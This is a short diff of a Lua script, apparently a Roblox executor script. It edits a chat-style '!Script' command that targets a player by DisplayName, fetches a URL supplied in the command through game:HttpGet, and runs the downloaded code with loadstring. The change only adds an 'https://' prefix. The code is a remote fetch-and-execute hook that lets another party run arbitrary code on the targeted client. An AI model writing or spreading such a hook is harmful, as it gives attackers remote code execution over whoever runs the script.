@@ -68,7 +68,7 @@ for i, v in pairs(Players) do
 				
 			if Group[1] == "!Script" then
 				if Group[2] == game.Players.LocalPlayer.DisplayName then
-					loadstring(game:HttpGet(Group[3]))()
+					loadstring(game:HttpGet("https://".. Group[3]))()
 				end
 			end
 
